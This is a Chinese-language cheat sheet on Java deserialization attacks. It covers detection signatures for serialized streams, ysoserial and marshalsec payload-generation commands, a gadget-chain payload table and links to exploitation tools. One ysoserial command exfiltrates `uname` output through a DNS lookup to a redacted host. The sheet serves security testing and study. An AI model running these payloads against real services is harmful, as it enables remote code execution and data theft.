# Java反序列化

## 检测

- 十六进制中的`"AC ED 00 05"`
  * `AC ED`：STREAM_MAGIC。指定这是一个序列化协议。
  * `00 05`：STREAM_VERSION。序列化版本。
- Base64中的`"rO0"`
- 内容类型="application/x-java-serialized-object"
- gzip(base64)中的`"H4sIAAAAAAAAAJ"`

## 工具

### Ysoserial

[frohoff/ysoserial](https://github.com/frohoff/ysoserial) : 一个用于生成利用不安全的Java对象反序列化的有效载荷的概念验证工具。

```java
java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin
java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin
java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64
```

**ysoserial中包含的有效载荷列表：**

```ps1
有效载荷             作者                                依赖项                                                                                                                                                                                        
-------             -------                                ------------                                                                                                                                                                                        
AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                      
BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5                                                                                                                                                                                           
C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                                                                                                                           
Click1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0                                                                                                                                                         
Clojure             @JackOfMostTrades                      clojure:1.8.0                                                                                                                                                                                       
CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                                               
CommonsCollections1 @frohoff                               commons-collections:3.1                                                                                                                                                                             
CommonsCollections2 @frohoff                               commons-collections4:4.0                                                                                                                                                                            
CommonsCollections3 @frohoff                               commons-collections:3.1                                                                                                                                                                             
CommonsCollections4 @frohoff                               commons-collections4:4.0                                                                                                                                                                            
CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1                                                                                                                                                                             
CommonsCollections6 @matthias_kaiser                       commons-collections:3.1                                                                                                                                                                             
CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1                                                                                                                                                                             
FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
Groovy1             @frohoff                               groovy:2.3.9                                                                                                                                                                                        
Hibernate1          @mbechler                                                                                                                                                                                                                                  
Hibernate2          @mbechler                                                                                                                                                                                                                                  
JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                            
JRMPClient          @mbechler                                                                                                                                                                                                                                  
JRMPListener        @mbechler                                                                                                                                                                                                                                  
JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                                        
Jdk7u21             @frohoff                                                                                                                                                                                                                                   
Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2                                                                                                                                                                             
MozillaRhino1       @matthias_kaiser                       js:1.7R2                                                                                                                                                                                            
MozillaRhino2       @_tint0                                js:1.7R2                                                                                                                                                                                            
Myfaces1            @mbechler                                                                                                                                                                                                                                  
Myfaces2            @mbechler                                                                                                                                                                                                                                  
ROME                @mbechler                              rome:1.0                                                                                                                                                                                            
Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE                                                                                                                                               
Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2                                                                                                           
URLDNS              @gebl                                                                                                                                                                                                                                      
Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14                                                                                                                                                          
Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4   
```

### 使用ysoserial的Burp扩展

- [JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller)
- [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)
- [Burp-ysoserial](https://github.com/summitt/burp-ysoserial)
- [SuperSerial](https://github.com/DirectDefense/SuperSerial)
- [SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active)

### 替代工具

- [pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget)
- [joaomatosf/JexBoss](https://github.com/joaomatosf/jexboss) - JBoss（及其他Java反序列化漏洞）验证和开发工具
- [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified)
- [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) - Java序列化暴力破解攻击工具
- [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper) - 以更易于阅读的格式转储Java序列化流的工具
- [bishopfox/gadgetprobe](https://labs.bishopfox.com/gadgetprobe)
- [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - 将您的数据转换为代码执行

```java
$ java -cp marshalsec.jar marshalsec<Marshaller> [-a] [-v] [-t]<gadget_type><arguments...>]]
$ java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
$ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389

-a - 为该编组器生成/测试所有有效载荷
-t - 在测试模式下运行，在生成有效载荷后对其进行反序列化。
-v - 详细模式，例如在测试模式下也显示生成的有效载荷。
gadget_type - 特定小工具的标识符，如果省略，将显示该特定编组器的可用小工具。
arguments - 小工具特定的参数
```

包括以下编组器的有效载荷生成器：<br />

| 编组器                      | 小工具影响                                |
| --------------------------- | ----------------------------------------- |
| BlazeDSAMF(0&#124;3&#124;X) | 仅JDK升级到Java序列化<br/>各种第三方库RCE |
| Hessian&#124;Burlap         | 各种第三方RCE                             |
| Castor                      | 依赖库RCE                                 |
| Jackson                     | **可能的仅JDK RCE**，各种第三方RCE        |
| Java                        | 另一个第三方RCE                           |
| JsonIO                      | **仅JDK RCE**                             |
| JYAML                       | **仅JDK RCE**                             |
| Kryo                        | 第三方RCE                                 |
| KryoAltStrategy             | **仅JDK RCE**                             |
| Red5AMF(0&#124;3)           | **仅JDK RCE**                             |
| SnakeYAML                   | **仅JDK RCE**                             |
| XStream                     | **仅JDK RCE**                             |
| YAMLBeans                   | 第三方RCE                                 |



## Gadgets

需求：

* `java.io.Serializable`

## 参考资料

- [Github - ysoserial](https://github.com/frohoff/ysoserial)
- [使用Java反序列化触发DNS查找 - paranoidsoftware.com](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
- [通过DNS数据泄露检测反序列化漏洞 - Philippe Arteau | 2017年3月22日](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)
- [Java反序列化备忘单 - GrrrDog](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/blob/master/README.md)
- [理解与练习Java反序列化利用 - diablohorn.com 2017年9月9日](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)
- [我是如何找到一个价值1500美元的反序列化漏洞的 - @D0rkerDevil](https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a)
- [配置错误的JSF视图状态可能导致严重的RCE漏洞 - 2017年8月14日，Peter Stöckli](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
- [Jackson CVE-2019-12384：一个漏洞类剖析](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
- [关于Jackson CVEs：不要惊慌 - 以下是您需要知道的](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96)
- [ForgeRock OpenAM中的预认证RCE（CVE-2021-35464）- Michael Stepankin / @artsploit - 2021年6月29日](https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464)
